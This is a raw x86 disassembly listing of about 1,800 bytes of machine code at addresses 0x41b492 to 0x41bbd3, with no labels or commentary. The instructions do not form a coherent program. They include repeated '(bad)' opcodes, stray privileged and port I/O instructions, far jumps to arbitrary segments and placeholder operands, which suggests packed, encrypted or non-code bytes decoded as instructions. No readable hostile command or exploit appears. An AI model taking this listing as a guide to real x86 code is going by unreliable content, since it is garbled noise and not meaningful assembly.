  41b492:	lock or eax,0x8b2f58c
  41b498:	lahf   
  41b499:	mov    bl,0x28
  41b49b:	in     eax,dx
  41b49c:	adc    edx,DWORD PTR [ebx+ecx*4]
  41b49f:	imul   ebp,edx,0x12b92a47
  41b4a5:	jmp    0x20d8:0x745a201
  41b4ac:	repz inc eax
  41b4ae:	cmp    BYTE PTR [ecx+0x34],0xca
  41b4b2:	cmp    DWORD PTR [edx],0x280724e
  41b4b8:	inc    edx
  41b4b9:	dec    esi
  41b4ba:	xor    BYTE PTR ds:0x1e0369f9,0x7c
  41b4c1:	dec    ebx
  41b4c2:	jge    0x41b47e
  41b4c4:	jmp    0xb426:0x922330de
  41b4cb:	push   edx
  41b4cc:	fisttp WORD PTR [ebp-0x79]
  41b4cf:	out    dx,eax
  41b4d0:	not    dl
  41b4d2:	jmp    0xfdbd:0x182c7430
  41b4d9:	imul   esi,edi,0x99bdd637
  41b4df:	mov    ebx,0x1b2c0377
  41b4e4:	or     al,0x65
  41b4e6:	push   0xffffffd7
  41b4e8:	pop    edx
  41b4e9:	add    eax,0x9b7191af
  41b4ee:	mov    al,0x39
  41b4f0:	les    eax,FWORD PTR [edx-0x5d462e04]
  41b4f6:	icebp  
  41b4f7:	xchg   ebx,eax
  41b4f8:	lds    esi,FWORD PTR [ecx-0xe]
  41b4fb:	retf   0x3e20
  41b4fe:	mov    ds:0xd67d1b71,eax
  41b503:	xrelease xchg DWORD PTR [edx-0x38],eax
  41b507:	ret    
  41b508:	sub    bl,BYTE PTR [esi+ecx*2-0x7ab673c0]
  41b50f:	(bad)  
  41b510:	pop    eax
  41b511:	test   eax,0x62d26ea3
  41b516:	mov    ebp,ecx
  41b518:	dec    edx
  41b519:	xchg   edx,eax
  41b51a:	sub    DWORD PTR [ebp+0x2e],0xf1dd717e
  41b521:	lea    ebx,[ebp+0x1b]
  41b524:	adc    dh,BYTE PTR [edi-0x69e8db98]
  41b52a:	aam    0xf2
  41b52c:	ret    0xabd4
  41b52f:	das    
  41b530:	stos   DWORD PTR es:[edi],eax
  41b531:	inc    ecx
  41b532:	jmp    0x41b59d
  41b534:	xor    BYTE PTR [esi],bl
  41b536:	sbb    eax,0x496fb2f6
  41b53b:	fistp  DWORD PTR fs:[ebp+0x21]
  41b53f:	cmp    al,0x4d
  41b541:	cwde   
  41b542:	into   
  41b543:	mov    ah,0x48
  41b545:	mov    ecx,0xe35b75be
  41b54a:	jbe    0x41b4ea
  41b54c:	push   0x15
  41b54e:	mov    bl,0x9d
  41b550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b551:	aaa    
  41b552:	ficom  WORD PTR [esi*2-0x4ff9e8c7]
  41b559:	lods   al,BYTE PTR ds:[esi]
  41b55a:	push   es
  41b55b:	je     0x41b50e
  41b55d:	or     al,0xb
  41b55f:	lea    ebp,[edx-0x3861c52a]
  41b565:	xor    BYTE PTR [edx],0xfa
  41b568:	fild   WORD PTR [eax-0x59aff0f7]
  41b56e:	push   ds
  41b56f:	xor    DWORD PTR [ebx+0x52],ebp
  41b572:	outs   dx,DWORD PTR ds:[esi]
  41b573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b574:	cmp    BYTE PTR [edi-0x6b8d9d4c],cl
  41b57a:	pop    edi
  41b57b:	daa    
  41b57c:	in     al,0x6a
  41b57e:	cmp    DWORD PTR [edi+ebp*1-0x2ff85282],eax
  41b585:	xchg   esi,eax
  41b586:	xor    bl,BYTE PTR [edi]
  41b588:	inc    edi
  41b589:	xchg   edi,eax
  41b58a:	test   al,0x63
  41b58c:	sbb    bh,BYTE PTR [esi]
  41b58e:	and    al,0x68
  41b590:	jmp    0x41b547
  41b592:	cdq    
  41b593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b594:	out    dx,al
  41b595:	jp     0x41b584
  41b597:	mov    bh,0x92
  41b599:	retf   0x2391
  41b59c:	outs   dx,DWORD PTR ds:[esi]
  41b59d:	pop    ss
  41b59e:	imul   DWORD PTR [ebp+0x5a]
  41b5a1:	pop    ebx
  41b5a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5a3:	stos   DWORD PTR es:[edi],eax
  41b5a4:	mov    dh,0x4a
  41b5a6:	sub    esi,DWORD PTR [esi+0x29]
  41b5a9:	je     0x41b59b
  41b5ab:	inc    ebx
  41b5ac:	cdq    
  41b5ad:	xchg   esi,eax
  41b5ae:	adc    BYTE PTR [bx+di],cl
  41b5b1:	cmp    bl,BYTE PTR [edi]
  41b5b3:	in     eax,dx
  41b5b4:	adc    al,0xd3
  41b5b6:	outs   dx,DWORD PTR ds:[esi]
  41b5b7:	fwait
  41b5b8:	and    ebx,DWORD PTR [ebp-0x4fc802e4]
  41b5be:	pop    ebx
  41b5bf:	out    0x67,al
  41b5c1:	stc    
  41b5c2:	cs pop esi
  41b5c4:	iret   
  41b5c5:	adc    esp,DWORD PTR [esi-0x455b4fac]
  41b5cb:	cmp    ah,BYTE PTR [ebx-0x56]
  41b5ce:	dec    ecx
  41b5cf:	loopne 0x41b578
  41b5d1:	aaa    
  41b5d2:	mov    ds:0x28502d05,al
  41b5d7:	adc    al,0x8
  41b5d9:	push   ebp
  41b5da:	push   edi
  41b5db:	pop    edi
  41b5dc:	pop    ds
  41b5dd:	push   ds
  41b5de:	ror    bl,cl
  41b5e0:	xchg   edi,eax
  41b5e1:	pop    ebp
  41b5e2:	xchg   BYTE PTR [esi-0x3c],ah
  41b5e5:	dec    edi
  41b5e6:	cs push ss
  41b5e8:	ror    BYTE PTR [esi-0x11],0x43
  41b5ec:	adc    ch,BYTE PTR [ebx-0x52]
  41b5ef:	sbb    BYTE PTR [ebx],0xea
  41b5f2:	xchg   BYTE PTR [ebx-0x45],ah
  41b5f5:	out    dx,al
  41b5f6:	jnp    0x41b5cb
  41b5f8:	mov    ch,al
  41b5fa:	sub    dl,cl
  41b5fc:	popa   
  41b5fd:	(bad)  
  41b5fe:	mov    ah,BYTE PTR [esi+0x34]
  41b601:	push   edx
  41b602:	push   edi
  41b603:	das    
  41b604:	aad    0x69
  41b606:	adc    DWORD PTR [edx],esp
  41b608:	ins    DWORD PTR es:[edi],dx
  41b609:	dec    ecx
  41b60a:	es ret 
  41b60c:	or     BYTE PTR [ecx-0x2b],bh
  41b60f:	push   ebx
  41b610:	dec    esp
  41b611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b612:	data16 add al,BYTE PTR [edx]
  41b615:	stc    
  41b616:	jmp    0x41b612
  41b618:	in     eax,dx
  41b619:	in     eax,dx
  41b61a:	mov    ebp,0xd0302222
  41b61f:	inc    esp
  41b620:	pop    ss
  41b621:	fiadd  WORD PTR [eax-0x32f612cb]
  41b627:	call   0x7aebf518
  41b62c:	jg     0x41b5ca
  41b62e:	test   DWORD PTR [edx],edx
  41b630:	stc    
  41b631:	gs bnd jge 0x41b62f
  41b635:	out    dx,al
  41b636:	test   ch,ch
  41b638:	lahf   
  41b639:	mov    ?,eax
  41b63b:	push   cs
  41b63c:	sar    DWORD PTR [eax-0xf4b8dd6],0x31
  41b643:	sbb    cl,BYTE PTR [esi]
  41b645:	mov    es,WORD PTR [edi-0x22]
  41b648:	cmp    BYTE PTR [ebx+0x42db2129],al
  41b64e:	retf   
  41b64f:	fild   DWORD PTR [edx]
  41b651:	inc    ebx
  41b652:	or     dh,BYTE PTR [esi+0x35f6b5db]
  41b658:	outs   dx,DWORD PTR ds:[esi]
  41b659:	inc    edx
  41b65a:	push   0x1b58003f
  41b65f:	cmp    eax,0x7019cf39
  41b664:	gs jmp 0x5f50:0xe18cb570
  41b66c:	adc    BYTE PTR [esi-0x7b0fac6b],0xf5
  41b673:	cmp    edi,DWORD PTR [ebp+ecx*1+0x67]
  41b677:	pop    esp
  41b678:	mov    dh,BYTE PTR [eax+0x2a646315]
  41b67e:	xor    cl,BYTE PTR [ebx-0x5c]
  41b681:	ss push esi
  41b683:	jp     0x41b648
  41b685:	xor    ebx,ecx
  41b687:	inc    edx
  41b688:	lock jl 0x41b6d4
  41b68b:	mov    esi,0xdb8c2e22
  41b690:	es fwait
  41b692:	and    esi,esi
  41b694:	or     eax,0x356d6215
  41b699:	cmp    edx,DWORD PTR [edi+0x11]
  41b69c:	mov    ebx,0x2443aa3d
  41b6a1:	(bad)  
  41b6a2:	ror    BYTE PTR [esi+ecx*1+0x25],1
  41b6a6:	xor    al,dl
  41b6a8:	call   0x2618:0x46af8d4
  41b6af:	jmp    0x626a23b5
  41b6b4:	idiv   DWORD PTR [esi+edx*1-0x7ea80ada]
  41b6bb:	xchg   BYTE PTR [edi-0xc],al
  41b6be:	int    0x24
  41b6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6c1:	ja     0x41b6b9
  41b6c3:	outs   dx,DWORD PTR ds:[esi]
  41b6c4:	mov    esp,0x7b69606d
  41b6c9:	or     DWORD PTR [ebx-0x97a414c],eax
  41b6cf:	or     bh,BYTE PTR [edi]
  41b6d1:	stc    
  41b6d2:	push   ebp
  41b6d3:	push   ebx
  41b6d4:	adc    bl,0x98
  41b6d7:	imul   DWORD PTR [esp+eax*8+0x7afc1614]
  41b6de:	loop   0x41b6e1
  41b6e0:	push   ds
  41b6e1:	push   cs
  41b6e2:	aaa    
  41b6e3:	pop    ecx
  41b6e4:	and    eax,DWORD PTR [ebp-0x73]
  41b6e7:	fwait
  41b6e8:	push   esi
  41b6e9:	clc    
  41b6ea:	sbb    ebx,edi
  41b6ec:	inc    esi
  41b6ed:	mov    al,BYTE PTR [edx]
  41b6ef:	pusha  
  41b6f0:	cli    
  41b6f1:	mov    WORD PTR [eax+0x3d],gs
  41b6f4:	pop    eax
  41b6f5:	lahf   
  41b6f6:	dec    esp
  41b6f7:	dec    eax
  41b6f8:	je     0x41b6a7
  41b6fa:	mov    esi,0x5f2048f0
  41b6ff:	push   ebx
  41b700:	sub    bh,bh
  41b702:	xor    ah,BYTE PTR [edx]
  41b704:	xor    DWORD PTR [esi+ebp*1],ecx
  41b707:	scas   eax,DWORD PTR es:[edi]
  41b708:	adc    al,0xa2
  41b70a:	lahf   
  41b70b:	data16 mov ds:0x8d746159,al
  41b711:	dec    ebp
  41b712:	jb     0x41b770
  41b714:	mul    al
  41b716:	and    al,0x9e
  41b718:	int    0xc0
  41b71a:	mov    ecx,0x49e3ca84
  41b71f:	xchg   BYTE PTR [edi-0x78],cl
  41b722:	popf   
  41b723:	loop   0x41b6f9
  41b725:	adc    ecx,edi
  41b727:	or     eax,0x2e89dfe4
  41b72c:	adc    dh,ch
  41b72e:	jmp    0x9e12ac3c
  41b733:	mov    dl,0x4e
  41b735:	dec    edx
  41b736:	sysret 
  41b738:	push   ebp
  41b739:	push   esi
  41b73a:	pop    esp
  41b73b:	aad    0xdb
  41b73d:	cld    
  41b73e:	lock mov eax,0xe426f16a
  41b744:	xchg   BYTE PTR [ecx],dl
  41b746:	inc    esi
  41b747:	idiv   DWORD PTR [edi]
  41b749:	lahf   
  41b74a:	jbe    0x41b767
  41b74c:	sbb    edx,DWORD PTR [edx]
  41b74e:	sub    BYTE PTR [eax-0x2f],bl
  41b751:	cwde   
  41b752:	lods   eax,DWORD PTR ds:[esi]
  41b753:	pop    esi
  41b754:	or     eax,0x9a6b86c9
  41b759:	scas   eax,DWORD PTR es:[edi]
  41b75a:	xchg   DWORD PTR [edi-0x56a1bde8],esi
  41b760:	fild   WORD PTR [ebp+0x42]
  41b763:	je     0x41b720
  41b765:	add    edx,DWORD PTR [eax-0xe]
  41b768:	dec    edx
  41b769:	call   0x12bd:0xfb96fdbd
  41b770:	scas   al,BYTE PTR es:[edi]
  41b771:	mov    esp,0x55d8ccfb
  41b776:	retf   0x58ac
  41b779:	xor    al,0xd3
  41b77b:	xchg   edx,eax
  41b77c:	ror    DWORD PTR ds:0x558063b6,cl
  41b782:	sub    eax,0xcd2efe2b
  41b787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b788:	or     al,0xa7
  41b78a:	popa   
  41b78b:	dec    ecx
  41b78c:	call   0x388d:0x1c309437
  41b793:	jno    0x41b791
  41b795:	sbb    eax,0x8cf05453
  41b79a:	fadd   DWORD PTR [ecx+edx*8+0xe94b882]
  41b7a1:	and    ch,BYTE PTR [esp+edx*4-0x5d2c4bb]
  41b7a8:	xchg   ebx,eax
  41b7a9:	daa    
  41b7aa:	jno    0x41b82b
  41b7ac:	mov    bl,dl
  41b7ae:	mov    bh,BYTE PTR [ebp-0x1e]
  41b7b1:	out    0xc2,eax
  41b7b3:	jb     0x41b762
  41b7b5:	pop    es
  41b7b6:	and    al,0x9a
  41b7b8:	loop   0x41b756
  41b7ba:	shl    DWORD PTR [ebp-0x5c],cl
  41b7bd:	mov    eax,ds:0x15186a3a
  41b7c2:	outs   dx,BYTE PTR ds:[esi]
  41b7c3:	mov    bh,0xf1
  41b7c5:	sub    BYTE PTR [edx+edi*8],al
  41b7c8:	je     0x41b816
  41b7ca:	in     al,0xcd
  41b7cc:	push   es
  41b7cd:	cmp    eax,0x199b58e7
  41b7d2:	sbb    al,0x8d
  41b7d4:	repnz and al,0x36
  41b7d7:	jnp    0x41b772
  41b7d9:	mov    WORD PTR [ecx],?
  41b7db:	dec    esp
  41b7dc:	test   cl,dh
  41b7de:	push   ds
  41b7df:	sbb    eax,0xdf246fe7
  41b7e4:	and    DWORD PTR [esi],ebx
  41b7e6:	loopne 0x41b865
  41b7e8:	outs   dx,DWORD PTR ds:[esi]
  41b7e9:	push   eax
  41b7ea:	ret    0x5b4f
  41b7ed:	sub    DWORD PTR [eax],0xfffffffc
  41b7f0:	inc    edx
  41b7f1:	out    dx,eax
  41b7f2:	outs   dx,BYTE PTR ds:[esi]
  41b7f3:	jmp    0x29ed:0xdf5184a2
  41b7fa:	xchg   DWORD PTR [ecx+0x6e42816b],esp
  41b800:	ds pop ebx
  41b802:	cmp    BYTE PTR [esi],al
  41b804:	lea    edx,[ebx+0x259a8858]
  41b80a:	pop    edx
  41b80b:	clc    
  41b80c:	pop    esp
  41b80d:	mov    ebp,0x4320e717
  41b812:	cmp    BYTE PTR [edi+0x17b3fa9a],cl
  41b818:	pop    ds
  41b819:	fs (bad) 
  41b81b:	pop    ebx
  41b81c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b81d:	cld    
  41b81e:	fist   WORD PTR [edi-0x6035e787]
  41b824:	adc    eax,0x4ccc94
  41b829:	xor    al,0xac
  41b82b:	call   0xf884:0x64e81d07
  41b832:	mov    bh,0x88
  41b834:	fisub  WORD PTR [ebp+0x78]
  41b837:	imul   ebp,DWORD PTR [edx+0x622ac3bd],0x6c
  41b83e:	ins    DWORD PTR es:[edi],dx
  41b83f:	lods   eax,DWORD PTR ds:[esi]
  41b840:	jno    0x41b87e
  41b842:	imul   ebp,DWORD PTR [ecx],0xffffffc9
  41b845:	jmp    0x41b8be
  41b847:	ins    DWORD PTR es:[edi],dx
  41b848:	push   eax
  41b849:	in     eax,dx
  41b84a:	leave  
  41b84b:	std    
  41b84c:	xor    dl,BYTE PTR [ecx]
  41b84e:	sub    BYTE PTR [edx+esi*4],ch
  41b851:	and    BYTE PTR [esi+0x1fe440c5],cl
  41b857:	inc    edx
  41b858:	dec    ebp
  41b859:	mov    edi,DWORD PTR [ebx+0xe827dfb]
  41b85f:	xor    al,BYTE PTR [edx]
  41b861:	sbb    esp,ebx
  41b863:	cmp    DWORD PTR [edi-0x31abf146],0x59
  41b86a:	ins    DWORD PTR es:[edi],dx
  41b86b:	pop    ss
  41b86c:	inc    BYTE PTR [ebx]
  41b86e:	fdiv   DWORD PTR [ebp+0x797123d9]
  41b874:	arpl   WORD PTR [edx-0x107b3682],cx
  41b87a:	push   esi
  41b87b:	stos   DWORD PTR es:[edi],eax
  41b87c:	gs outs dx,BYTE PTR ds:[esi]
  41b87f:	xchg   ecx,eax
  41b880:	mov    ebp,DWORD PTR [ebp-0x1b]
  41b883:	mov    ds:0xd6ab343,al
  41b888:	push   0xffffffff
  41b88a:	sub    DWORD PTR [eax],edi
  41b88c:	and    edi,DWORD PTR [edi+edx*8-0x4b400d3a]
  41b893:	pop    DWORD PTR [edi]
  41b895:	mul    al
  41b897:	add    BYTE PTR [ebx+0x22],ch
  41b89a:	das    
  41b89b:	jg     0x41b8d2
  41b89d:	mov    ds:0x2081b25e,eax
  41b8a2:	sti    
  41b8a3:	mov    eax,ds:0xbc392b5a
  41b8a8:	push   0xffffffd0
  41b8aa:	les    edi,FWORD PTR [edi]
  41b8ac:	xor    ebp,ecx
  41b8ae:	mov    ebp,0x5f186ac5
  41b8b3:	arpl   WORD PTR [esp+eiz*4-0x20cf2bb9],ax
  41b8ba:	dec    ebx
  41b8bb:	fnstenv [ecx]
  41b8bd:	repnz shr DWORD PTR [ebp+0x72aba539],0xb1
  41b8c5:	xor    al,0xa6
  41b8c7:	mov    ebp,DWORD PTR [ebp-0x9a89166]
  41b8cd:	call   0xc53b:0x45791cd0
  41b8d4:	cmp    ebp,DWORD PTR [ebx-0x6ed14eb8]
  41b8da:	scas   eax,DWORD PTR es:[edi]
  41b8db:	jbe    0x41b891
  41b8dd:	mov    ah,BYTE PTR [ecx+edx*4+0x4c]
  41b8e1:	cmp    ebp,DWORD PTR [eax+esi*8]
  41b8e4:	jmp    0xabe:0x51e89cb7
  41b8eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8ec:	cmc    
  41b8ed:	imul   esi,DWORD PTR [ebx],0x2b
  41b8f0:	jecxz  0x41b876
  41b8f2:	jae    0x41b879
  41b8f4:	jp     0x41b929
  41b8f6:	fadd   DWORD PTR [esi]
  41b8f8:	jo     0x41b8cd
  41b8fa:	dec    edi
  41b8fb:	in     eax,0x26
  41b8fd:	stos   DWORD PTR es:[edi],eax
  41b8fe:	out    0x72,eax
  41b900:	(bad)  
  41b901:	cld    
  41b902:	fistp  DWORD PTR [ecx+eax*1]
  41b905:	int    0x9f
  41b907:	mov    ebx,DWORD PTR [ecx+0x2175dfb]
  41b90d:	jecxz  0x41b896
  41b90f:	loop   0x41b908
  41b911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b912:	xor    dl,dh
  41b914:	shl    DWORD PTR [edx],cl
  41b916:	adc    BYTE PTR [ebp+eiz*1-0x7cb240e6],bh
  41b91d:	leave  
  41b91e:	jne    0x41b929
  41b920:	les    eax,FWORD PTR [eax+edx*2]
  41b923:	aad    0x7f
  41b925:	pop    ds
  41b926:	cmc    
  41b927:	out    0xb,al
  41b929:	or     al,BYTE PTR [esp+esi*1+0xf]
  41b92d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b92e:	pop    ss
  41b92f:	xchg   esp,eax
  41b930:	xchg   esi,eax
  41b931:	mov    esp,0x2ca65510
  41b936:	loope  0x41b92a
  41b938:	sbb    ebp,DWORD PTR [esi+ebp*2]
  41b93b:	lahf   
  41b93c:	lock inc esp
  41b93e:	adc    edi,ecx
  41b940:	mov    eax,0xb6106f53
  41b945:	pop    es
  41b946:	jo     0x41b8fb
  41b948:	xchg   ebp,eax
  41b949:	lea    ecx,[ebx]
  41b94b:	adc    BYTE PTR [esi],bh
  41b94d:	or     DWORD PTR [ebx+eiz*4-0x753b996f],edx
  41b954:	mov    ebx,0xe58734
  41b959:	ss dec ecx
  41b95b:	int3   
  41b95c:	gs mov dh,0x41
  41b95f:	mov    bl,0xd4
  41b961:	push   ecx
  41b962:	add    bh,BYTE PTR [esi-0x4129b8cf]
  41b968:	mov    dh,0x35
  41b96a:	stos   BYTE PTR es:[edi],al
  41b96b:	loopne 0x41b909
  41b96d:	stos   DWORD PTR es:[edi],eax
  41b96e:	pusha  
  41b96f:	mov    cl,0x7b
  41b971:	dec    edi
  41b972:	xlat   BYTE PTR ds:[ebx]
  41b973:	pop    ds
  41b974:	dec    esi
  41b975:	mov    eax,ds:0xee12ef0c
  41b97a:	popa   
  41b97b:	icebp  
  41b97c:	fcom   QWORD PTR [ebp+0x48fa7a]
  41b982:	push   DWORD PTR [ecx-0x4ef7c900]
  41b988:	pop    edi
  41b989:	out    dx,al
  41b98a:	or     BYTE PTR [ebx],bh
  41b98c:	imul   edi,ebp,0x542420b8
  41b992:	and    dl,BYTE PTR [edx]
  41b994:	mov    bl,0xcb
  41b996:	xor    al,0xbc
  41b998:	sbb    BYTE PTR [ebx-0xf4492e6],dl
  41b99e:	xchg   ebp,eax
  41b99f:	mov    esi,0xabfa5e30
  41b9a4:	das    
  41b9a5:	pmulhuw mm0,mm1
  41b9a8:	inc    edi
  41b9a9:	test   al,0x40
  41b9ab:	les    ebx,FWORD PTR [ecx]
  41b9ad:	sub    DWORD PTR [eax],0x8f46e080
  41b9b3:	shr    DWORD PTR [ebp+0x17],cl
  41b9b6:	xchg   edi,eax
  41b9b7:	ja     0x41b99c
  41b9b9:	test   al,0xcd
  41b9bb:	add    eax,esp
  41b9bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9be:	leave  
  41b9bf:	mov    edx,DWORD PTR [eax]
  41b9c1:	push   es
  41b9c2:	pop    edx
  41b9c3:	(bad)
  41b9c6:	add    DWORD PTR [ebx+0x7f564e18],esp
  41b9cc:	hlt    
  41b9cd:	cs dec edx
  41b9cf:	cs push cs
  41b9d1:	cmp    esi,DWORD PTR [eax+0x26]
  41b9d4:	mov    cl,0xdb
  41b9d6:	data16 jb 0x41b98c
  41b9d9:	jecxz  0x41b971
  41b9db:	push   DWORD PTR [ebx-0x29a342ca]
  41b9e1:	cmp    BYTE PTR ds:0x3f9d20f0,cl
  41b9e7:	dec    esi
  41b9e8:	es aam 0x25
  41b9eb:	push   ebp
  41b9ec:	sub    ah,BYTE PTR [edi]
  41b9ee:	sti    
  41b9ef:	push   ds
  41b9f0:	or     ebx,DWORD PTR [ebx-0x55]
  41b9f3:	jmp    0x41b9fe
  41b9f5:	adc    BYTE PTR [ecx+0x73],0x39
  41b9f9:	add    al,0x7a
  41b9fb:	adc    ah,BYTE PTR [ebx+0x4ef5f9e6]
  41ba01:	dec    ecx
  41ba02:	inc    ebp
  41ba03:	adc    al,0x7c
  41ba05:	pop    edx
  41ba06:	loope  0x41ba67
  41ba08:	js     0x41b999
  41ba0a:	jg     0x41ba39
  41ba0c:	jb     0x41ba8d
  41ba0e:	xchg   esi,eax
  41ba0f:	adc    DWORD PTR [esi-0x1d],esi
  41ba12:	dec    edi
  41ba13:	adc    DWORD PTR [ecx+0x3c],esp
  41ba16:	ins    DWORD PTR es:[edi],dx
  41ba17:	and    eax,0x79634d8c
  41ba1c:	ins    BYTE PTR es:[edi],dx
  41ba1d:	inc    edi
  41ba1e:	cmp    BYTE PTR [ebp+0x1fc526e9],ah
  41ba24:	imul   ecx,DWORD PTR [ecx],0x5e
  41ba27:	mov    ch,0x31
  41ba29:	adc    ecx,ecx
  41ba2b:	jae    0x41b9cb
  41ba2d:	mov    al,ds:0x2905a0e9
  41ba32:	ja     0x41ba58
  41ba34:	shr    DWORD PTR [eax+0x7ed5c21c],1
  41ba3a:	out    0xd0,eax
  41ba3c:	fistp  QWORD PTR [ecx+ebx*2]
  41ba3f:	and    BYTE PTR [esi+0x3f],dl
  41ba42:	ss mov esi,0xbc7c4a97
  41ba48:	mov    eax,0x758b6ad8
  41ba4d:	add    BYTE PTR [esi-0x21cd1f4],ah
  41ba53:	ja     0x41ba0c
  41ba55:	mov    es,WORD PTR [eax+ecx*4]
  41ba58:	fwait
  41ba59:	scas   eax,DWORD PTR es:[edi]
  41ba5a:	sar    BYTE PTR [eax],cl
  41ba5c:	sub    eax,0xcb364ee7
  41ba61:	push   0xffffff84
  41ba63:	pop    esi
  41ba64:	in     ax,dx
  41ba66:	xor    al,0x80
  41ba68:	add    DWORD PTR [ebp+0x3b],edi
  41ba6b:	adc    al,0x93
  41ba6d:	daa    
  41ba6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba6f:	sub    eax,0xd5ca72c5
  41ba74:	jno    0x41bab9
  41ba76:	mov    eax,ds:0x4c0cfc93
  41ba7b:	fwait
  41ba7c:	mov    DWORD PTR [edx+edi*4+0x1e],esi
  41ba80:	fld    TBYTE PTR [edx-0xd]
  41ba83:	add    DWORD PTR [eax+0x2c],ebx
  41ba86:	hlt    
  41ba87:	js     0x41ba8f
  41ba89:	dec    esi
  41ba8a:	pusha  
  41ba8b:	retf   
  41ba8c:	adc    eax,0xa881b6a7
  41ba91:	add    eax,0x8d49691f
  41ba96:	mov    bl,0xd
  41ba98:	or     BYTE PTR [edi-0x30],cl
  41ba9b:	sub    ebx,DWORD PTR [edi+0x4d4c0f2f]
  41baa1:	mov    bh,0x60
  41baa3:	xchg   edx,eax
  41baa4:	ja     0x41baa0
  41baa6:	cmp    eax,0x94640d53
  41baab:	aam    0xf8
  41baad:	std    
  41baae:	ret    
  41baaf:	arpl   WORD PTR [ebx],ax
  41bab1:	and    DWORD PTR [eax-0x2],0xffffffb4
  41bab5:	xor    cl,BYTE PTR [edx]
  41bab7:	(bad)  
  41bab8:	push   ecx
  41bab9:	call   0x4724:0xd5a98b97
  41bac0:	es jge 0x41baac
  41bac3:	(bad)  
  41bac6:	adc    eax,0xc1253259
  41bacb:	pop    ecx
  41bacc:	icebp  
  41bacd:	fwait
  41bace:	pop    ecx
  41bacf:	(bad)  
  41bad0:	jbe    0x41ba77
  41bad2:	pop    edi
  41bad3:	mov    ecx,0x35c28f69
  41bad8:	and    dh,dh
  41bada:	push   ecx
  41badb:	in     eax,dx
  41badc:	xchg   edx,eax
  41badd:	inc    edi
  41bade:	pop    ss
  41badf:	fcmove st,st(0)
  41bae1:	jae    0x41bad0
  41bae3:	test   ch,bh
  41bae5:	and    esi,DWORD PTR [ecx]
  41bae7:	jmp    0x41ba75
  41bae9:	push   edi
  41baea:	pusha  
  41baeb:	mov    edx,DWORD PTR [edx+ecx*1-0x1a]
  41baef:	addr16 icebp 
  41baf1:	shr    DWORD PTR [esi+0x1d],0xba
  41baf5:	stos   DWORD PTR es:[edi],eax
  41baf6:	and    al,0xa8
  41baf8:	sahf   
  41baf9:	dec    ebp
  41bafa:	jae    0x41baa8
  41bafc:	sub    ah,dl
  41bafe:	rcl    DWORD PTR [ecx+0x35],1
  41bb01:	xor    eax,0xc7a976e0
  41bb06:	push   esi
  41bb07:	inc    edx
  41bb08:	mov    ebp,0x2a6fd571
  41bb0d:	sbb    DWORD PTR [ecx+edx*8+0x22],ebx
  41bb11:	cmp    al,0x68
  41bb13:	or     ebp,DWORD PTR [ebx]
  41bb15:	jecxz  0x41bb07
  41bb17:	aam    0x13
  41bb19:	mov    ebp,0xe95f2c0f
  41bb1e:	mov    al,0xee
  41bb20:	(bad)  
  41bb21:	popf   
  41bb22:	mov    edx,0xe73390e5
  41bb27:	nop
  41bb28:	icebp  
  41bb29:	push   ebx
  41bb2a:	add    eax,0x2187164b
  41bb2f:	jb     0x41bae8
  41bb31:	jp     0x41baf8
  41bb33:	and    eax,0xbc2d309c
  41bb38:	stos   DWORD PTR es:[edi],eax
  41bb39:	imul   esi,DWORD PTR [eax],0x1c7027b4
  41bb3f:	pushf  
  41bb40:	jmp    0x3d389593
  41bb45:	pop    eax
  41bb46:	call   0xbba3049c
  41bb4b:	pushf  
  41bb4c:	jns    0x41bba0
  41bb4e:	(bad)  
  41bb4f:	xchg   ebx,eax
  41bb50:	lea    ebx,[esi]
  41bb52:	stos   DWORD PTR es:[edi],eax
  41bb53:	inc    ebp
  41bb54:	and    BYTE PTR [esi-0x7],0x11
  41bb58:	test   eax,0xcca00dbe
  41bb5d:	inc    esi
  41bb5e:	and    eax,0x435dd3af
  41bb63:	(bad)  
  41bb64:	sbb    edx,esp
  41bb66:	shl    DWORD PTR [ecx],cl
  41bb68:	xor    ah,0xa2
  41bb6b:	add    bl,dl
  41bb6d:	(bad)  
  41bb6e:	shl    BYTE PTR [esi+0x71],cl
  41bb71:	push   eax
  41bb72:	scas   eax,DWORD PTR es:[edi]
  41bb73:	scas   eax,DWORD PTR es:[edi]
  41bb74:	xor    bl,BYTE PTR [esi+0x71]
  41bb77:	push   0x8247dc59
  41bb7c:	sti    
  41bb7d:	jno    0x41bb73
  41bb7f:	idiv   esp
  41bb81:	mov    ds:0xff805832,eax
  41bb86:	push   esi
  41bb87:	mov    eax,0xa042f30c
  41bb8c:	fwait
  41bb8d:	inc    ebx
  41bb8e:	int3   
  41bb8f:	push   ebp
  41bb90:	(bad)  
  41bb92:	ret    0x6ba
  41bb95:	adc    BYTE PTR [edi],dh
  41bb97:	mov    eax,DWORD PTR [ecx]
  41bb99:	mov    ebp,0x7cb0ac01
  41bb9e:	jne    0x41bb4f
  41bba0:	dec    esp
  41bba1:	fld    TBYTE PTR [edi+0x64f67781]
  41bba7:	inc    eax
  41bba8:	mov    eax,0x8bb12fb0
  41bbad:	pop    es
  41bbae:	shl    ecx,cl
  41bbb0:	cmp    dh,BYTE PTR [edi]
  41bbb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbb3:	pop    eax
  41bbb4:	in     al,0xfb
  41bbb6:	shl    ebx,1
  41bbb8:	mov    ah,0xb2
  41bbba:	outs   dx,BYTE PTR ds:[esi]
  41bbbb:	data16 (bad) 
  41bbbd:	stos   BYTE PTR es:[edi],al
  41bbbe:	xor    eax,0x3fe27de3
  41bbc3:	leave  
  41bbc4:	dec    ecx
  41bbc5:	mov    ebp,ebp
  41bbc7:	gs retf 
  41bbc9:	ins    DWORD PTR es:[edi],dx
  41bbca:	mov    esp,0x3321a201
  41bbcf:	inc    BYTE PTR [ecx-0x73]
  41bbd2:	dec    esp
  41bbd3:	scas   al,BYTE PTR es:[edi]
